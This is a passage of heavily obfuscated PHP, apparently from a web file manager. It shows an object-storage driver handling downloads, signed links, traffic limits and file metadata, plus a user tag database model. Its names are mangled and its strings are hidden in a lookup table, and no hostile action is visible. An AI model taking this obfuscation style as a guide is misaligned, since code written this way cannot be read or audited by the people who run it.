$¤Ãäóğ˜[4] . $îøİÇ£—; if (strpos($éö•ìÈ, $¤Ãäóğ˜[227]) === 0) { $É­ëıë¹ = array($¤Ãäóğ˜[234] => $É­ëıë¹, $¤Ãäóğ˜[224] => $ÇÍğ’°); if ($ŠüÚŸ œ) { $É­ëıë¹ = array_merge($É­ëıë¹, $ŠüÚŸ œ); } } return $É­ëıë¹; } public function listUploadParts($¾ìôËÕï, $ „×Ë­¬) { $…ËäÑù =& $_SERVER[Îûáû“ş]; $ÎÕˆÓ±Í = parse_url_query($ „×Ë­¬[$…ËäÑù[174]]); $„÷™·³‡ = $this->client->listParts($this->bucket, $this->pathEncode($¾ìôËÕï), $ÎÕˆÓ±Í[$…ËäÑù[223]]); $ó‘õæ÷ş = $„÷™·³‡->getListPart(); $şë‘íà  = array(); foreach ($ó‘õæ÷ş as $ô«¢—‹–) { $şë‘íà [] = array($…ËäÑù[1417] => $ô«¢—‹–->getPartNumber(), $…ËäÑù[1418] => trim($ô«¢—‹–->getETag(), $…ËäÑù[118])); } unset($ „×Ë­¬[$…ËäÑù[225]], $ „×Ë­¬[$…ËäÑù[229]]); $Ãâ­â“¢ = $this->multiUploadAuthData($¾ìôËÕï, $ „×Ë­¬); if (empty($Ãâ­â“¢)) { return !1; } return array($…ËäÑù[234] => $Ãâ­â“¢, $…ËäÑù[224] => $ „×Ë­¬[$…ËäÑù[224]], $…ËäÑù[236] => $şë‘íà ); } public function download($Í×­‰¶¼, $¥úóÎ‹œ) { if ($this->isFolder($Í×­‰¶¼)) { return !1; } try { $­ô¬áå = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¥úóÎ‹œ); $­ô¬áå = $this->trafficLimit($_SERVER[Îûáû“ş][109], $­ô¬áå); $this->client->getObject($this->bucket, $this->pathEncode($Í×­‰¶¼), $­ô¬áå); } catch (OSS\Core\OssException $û«’•Òô) { return !1; } return $¥úóÎ‹œ; } public function fileSubstr($Áò–ï±á, $ø¸Á…µÌ = 0, $Ùıµ–ˆ = false) { if ($ø¸Á…µÌ === -1) { $‰×íÙå‚ = array(); } else { if ($Ùıµ–ˆ === !1) { $ï‘±ı‡› = $this->size($Áò–ï±á); } else { $ï‘±ı‡› = $ø¸Á…µÌ + $Ùıµ–ˆ - 1; } $‰×íÙå‚ = array(OSS\OssClient::OSS_RANGE => "{$ø¸Á…µÌ}\x2d{$ï‘±ı‡›}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Áò–ï±á), $‰×íÙå‚); } catch (OSS\Core\OssException $è£¶½×») { think_exception($è£¶½×»->getMessage()); return !1; } } private function trafficLimit($íÛ Ä·®, $¹ÀÅÚµù = array()) { $±ñ¯¬®ß =& $_SERVER[Îûáû“ş]; if ($íÛ Ä·® == $±ñ¯¬®ß[1423] && $this->isUploadServer() || $íÛ Ä·® == $±ñ¯¬®ß[109] && $this->isFileOutServer()) { return $¹ÀÅÚµù; } $¬É ÎÎÄ = floatval($GLOBALS[$±ñ¯¬®ß[6]][$±ñ¯¬®ß[89]][$±ñ¯¬®ß[107]][$íÛ Ä·®]) * 1024 * 1024 * 8; if (!$¬É ÎÎÄ) { return $¹ÀÅÚµù; } $¬É ÎÎÄ = $¬É ÎÎÄ < 819200 ? 819200 : ($¬É ÎÎÄ > 838860800 ? 838860800 : $¬É ÎÎÄ); $¹ÀÅÚµù[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¬É ÎÎÄ); return $¹ÀÅÚµù; } public function link($¡¥ÈšãÂ, $¤¯Œï”‹ = array()) { $¼ Ø áÕ =& $_SERVER[Îûáû“ş]; if (!$this->exist($¡¥ÈšãÂ) || $this->isFolder($¡¥ÈšãÂ)) { return !1; } try { $¤¯Œï”‹ = $this->trafficLimit($¼ Ø áÕ[109], $¤¯Œï”‹); $¼ˆà°µí = $this->client->signUrl($this->bucket, $this->pathEncode($¡¥ÈšãÂ), 3600 * 12, $¼ Ø áÕ[230], $¤¯Œï”‹); return $this->getCdnLink($¼ˆà°µí); } catch (OSS\Core\OssException $·‚‘İ®¨) { return !1; } } public function fileOut($¹ÑåÅ, $–‹šÅÑİ = false, $ÈÙ°ìŞ˜ = false, $Ùî€×ÑÚ = '') { $ïÔ½»Ã± =& $_SERVER[Îûáû“ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($¹ÑåÅ, $–‹šÅÑİ, $ÈÙ°ìŞ˜, $Ùî€×ÑÚ); } if (!$ÈÙ°ìŞ˜) { $ÈÙ°ìŞ˜ = $this->pathThis($¹ÑåÅ); } $ÈÙ°ìŞ˜ = rawurlencode($ÈÙ°ìŞ˜); $ŸÑí°ª¬ = get_file_mime(get_path_ext($ÈÙ°ìŞ˜)); if ($ŸÑí°ª¬ == $ïÔ½»Ã±[217]) { return parent::fileOut($¹ÑåÅ, $–‹šÅÑİ, $ÈÙ°ìŞ˜, $Ùî€×ÑÚ); } $–‹šÅÑİ = $–‹šÅÑİ ? $ïÔ½»Ã±[1434] : $ïÔ½»Ã±[1435]; $©Ä•”î = array(OSS\OssClient::OSS_SUB_RESOURCE => $ïÔ½»Ã±[1436] . rawurlencode("{$–‹šÅÑİ}\73\146\x69\x6c\x65\x6e\x61\155\145\x3d{$ÈÙ°ìŞ˜}")); $©Ä•”î[OSS\OssClient::OSS_SUB_RESOURCE] .= $ïÔ½»Ã±[1437] . rawurlencode($ŸÑí°ª¬); $¯±ùÉÉæ = $this->link($¹ÑåÅ, $©Ä•”î); $this->fileOutLink($¯±ùÉÉæ); } public function fileOutServer($€Ì¿´²µ, $•‹Ÿô²Œ = false, $î‹ıÒî = false, $›Ö¶†äâ = '') { parent::fileOut($€Ì¿´²µ, $•‹Ÿô²Œ, $î‹ıÒî, $›Ö¶†äâ); } public function fileOutImage($ÕÖ‹©§Ê, $Ğ–®Ş ù = 250) { $ïÉ„Ãç  = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Îûáû“ş][1438] . $Ğ–®Ş ù); $ö¥¼úô = $this->link($ÕÖ‹©§Ê, $ïÉ„Ãç ); $this->fileOutLink($ö¥¼úô); } public function fileOutImageServer($ëˆ«¸Œ, $Á¾»Íà× = 250) { parent::fileOutImage($ëˆ«¸Œ, $Á¾»Íà×); } public function fileOutLink($Ôƒ¢ÌÄî) { $Î°º½ÏÅ =& $_SERVER[Îûáû“ş]; if (!$this->isCdnHost() && substr($Ôƒ¢ÌÄî, 0, 7) == $Î°º½ÏÅ[1339]) { $Ôƒ¢ÌÄî = $Î°º½ÏÅ[1340] . substr($Ôƒ¢ÌÄî, 7); } header($Î°º½ÏÅ[161] . $Ôƒ¢ÌÄî); die; } public function hashMd5($ÚÔëš•, $­õ——à³ = '') { $€ã¥ö Í =& $_SERVER[Îûáû“ş]; $£±õÙ‘æ = $this->_objectMeta($ÚÔëš•); if (!$£±õÙ‘æ) { return $€ã¥ö Í[12]; } if (!isset($£±õÙ‘æ[$€ã¥ö Í[1413]]) && !empty($­õ——à³)) { $î¸ê¾ßÄ = $this->updateObjMeta($ÚÔëš•, array($€ã¥ö Í[1413] => $­õ——à³)); $£±õÙ‘æ[$€ã¥ö Í[1413]] = $î¸ê¾ßÄ ? $­õ——à³ : $€ã¥ö Í[12]; } return isset($£±õÙ‘æ[$€ã¥ö Í[1413]]) ? strtolower($£±õÙ‘æ[$€ã¥ö Í[1413]]) : $€ã¥ö Í[12]; } public function size($Šå‹±é¥) { $ª÷ıà = $this->objectMeta($Šå‹±é¥); return $ª÷ıà ? $ª÷ıà[$_SERVER[Îûáû“ş][76]] : 0; } public function info($¤áïÂâË) { if ($this->isFolder($¤áïÂâË)) { return $this->folderInfo($¤áïÂâË); } else { if ($this->isFile($¤áïÂâË)) { return $this->fileInfo($¤áïÂâË); } } return !1; } public function exist($¬ãß´å¨) { return $this->isFile($¬ãß´å¨) || $this->isFolder($¬ãß´å¨); } public function isFile($ÌàŞÙÑß) { return !$this->isFolder($ÌàŞÙÑß) && $this->objectMeta($ÌàŞÙÑß); } public function isFolder($Ô‹õñˆ) { return $this->cacheMethod($_SERVER[Îûáû“ş][165], $Ô‹õñˆ); } protected function objectMeta($İŸÈºÄ«) { return $this->cacheMethod($_SERVER[Îûáû“ş][167], $İŸÈºÄ«); } protected function _objectMeta($ ¡Š÷’œ) { $ëš¼ßò =& $_SERVER[Îûáû“ş]; try { $·°˜ò¥ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ ¡Š÷’œ)); } catch (OSS\Core\OssException $é—À­ïŠ) { $·°˜ò¥ = !1; } if ($·°˜ò¥) { $·°˜ò¥[$ëš¼ßò[76]] = intval($·°˜ò¥[$ëš¼ßò[1411]]); } return $·°˜ò¥; } protected function _isFolder($ÎˆÍ‰’) { $İ–ş÷•¸ =& $_SERVER[Îûáû“ş]; if ($ÎˆÍ‰’ == $İ–ş÷•¸[12] || $ÎˆÍ‰’ == $İ–ş÷•¸[8]) { return !0; } $œôÜŒÃé = array($İ–ş÷•¸[1407] => $İ–ş÷•¸[8], $İ–ş÷•¸[1408] => rtrim($ÎˆÍ‰’, $İ–ş÷•¸[8]) . $İ–ş÷•¸[8], $İ–ş÷•¸[1409] => 1, $İ–ş÷•¸[1410] => $İ–ş÷•¸[12]); $ïíï÷İ¾ = $this->client->listObjects($this->bucket, $œôÜŒÃé); if ($ïíï÷İ¾->getObjectList() || $ïíï÷İ¾->getPrefixList()) { return !0; } return !1; } } goto EÍšƒ°÷àõ; e—¦·ï÷Ÿ–: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($ÒÂŸí‰‡) { $ñ±‡àÎ† =& $_SERVER[Îûáû“ş]; return array($ñ±‡àÎ†[1972] => array($ñ±‡àÎ†[2356] . USER_ID, $ñ±‡àÎ†[1973])); } protected function listData() { $§ë„Çæ˜ =& $_SERVER[Îûáû“ş]; $¡ğø™Ü = array($§ë„Çæ˜[1661] => USER_ID, $§ë„Çæ˜[483] => array($§ë„Çæ˜[1976], 0)); $ôú³§ìô = $§ë„Çæ˜[2357]; $ª’Á¯¨¦ = $this->field($ôú³§ìô)->where($¡ğø™Ü)->order($§ë„Çæ˜[1979])->select(); return $ª’Á¯¨¦ ? $ª’Á¯¨¦ : array(); } protected function addToTag($Ï™Ùıõı, $¸õñ¸) { $Ã¹ıúÛ =& $_SERVER[Îûáû“ş]; if (!Model($Ã¹ıúÛ[2120])->listData($¸õñ¸)) { return !1; } if (is_numeric($Ï™Ùıõı)) { $÷öÕÊü’ = Model($Ã¹ıúÛ[824])->pathInfo($Ï™Ùıõı); if (!$÷öÕÊü’) { return !1; } } else { $÷öÕÊü’ = IO::infoSimple($Ï™Ùıõı); if (!$÷öÕÊü’) { return !1; } $›‰É¿ÜÍ = $÷öÕÊü’[$Ã¹ıúÛ[32]]; $˜·ı·Ô = $÷öÕÊü’[$Ã¹ıúÛ[33]]; if (isset($÷öÕÊü’[$Ã¹ıúÛ[410]])) { $˜·ı·Ô = $÷öÕÊü’[$Ã¹ıúÛ[410]] == $Ã¹ıúÛ[88] ? $Ã¹ıúÛ[75] : $Ã¹ıúÛ[200]; } } $õäÁÁí½ = array($Ã¹ıúÛ[1661] => USER_ID, $Ã¹ıúÛ[483] => $¸õñ¸, $Ã¹ıúÛ[421] => $Ï™Ùıõı, $Ã¹ıúÛ[422] => $˜·ı·Ô ? $˜·ı·Ô : $Ã¹ıúÛ[416], $Ã¹ıúÛ[420] => $›‰É¿ÜÍ ? $›‰É¿ÜÍ : $Ã¹ıúÛ[12], $Ã¹ıúÛ[1865] => 0); if ($this->where($õäÁÁí½)->find()) { return !1; } return $this->add($õäÁÁí½); } protected function removeFromTag($Œ° é½¶, $ñªÅ‚Âª) { $‚¯Ùìªã =& $_SERVER[Îûáû“ş]; if (!Model($‚¯Ùìªã[2120])->listData($ñªÅ‚Âª)) { return !1; } if (is_array($Œ° é½¶)) { $Œ° é½¶ = array($‚¯Ùìªã[7], $Œ° é½¶); } $ã¸ÜóÃ = array($‚¯Ùìªã[1661] => USER_ID, $‚¯Ùìªã[483] => $ñªÅ‚Âª, $‚¯Ùìªã[421] => $Œ° é½¶); return $this->where($ã¸ÜóÃ)->delete(); } protected function removeByTag($ëöúûñş) { $½½µ¡Ğµ =& $_SERVER[Îûáû“ş]; if (!$ëöúûñş) { return !1; } $îÔ›ÀÕ = array($½½µ¡Ğµ[1661] => USER_ID, $½½µ¡Ğµ[483] => $ëöúûñş); return $this->where($îÔ›ÀÕ)->delete(); } protected function removeBySource($…Şó·…®) { $ƒÂ¾—ê© =& $_SERVER[Îûáû“ş]; if (is_array($…Şó·…®)) { $…Şó·…® = array($ƒÂ¾—ê©[7], $…Şó·…®); } $Ù¿ğò¯ = array($ƒÂ¾—ê©[1661] => USER_ID, $ƒÂ¾—ê©[483] => array($ƒÂ¾—ê©[1016], 0), $ƒÂ¾—ê©[421] => $…Şó·…®); return $this->where($Ù¿ğò¯)->delete(); } }